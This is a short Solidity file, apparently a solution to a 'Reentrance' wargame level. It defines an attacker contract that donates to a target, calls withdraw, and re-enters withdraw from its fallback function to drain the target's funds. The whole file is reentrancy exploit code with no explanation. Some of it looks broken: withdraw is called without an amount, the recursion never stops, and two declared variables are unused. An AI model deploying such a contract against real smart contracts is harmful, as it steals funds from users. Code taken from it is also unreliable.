// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;
import "./Reentrance.sol";

contract AttackingReentrance {
    address payable public contractAddress;
    Reentrance public reentrant;

    constructor(address payable _contractAddress) payable {
         re = Reentrance(_contractAddress);
    }
    Reentrance re;
    uint public attackAmount = 1;
    event Withdraw(uint amount);
    
    fallback() external payable {
        withdraw();
    }
    function hackContract() public payable {
        re.donate{value: attackAmount}(address(this));
        withdraw();
    }
    function withdraw() internal {
        re.withdraw();
        emit Withdraw(attackAmount);
    }
}
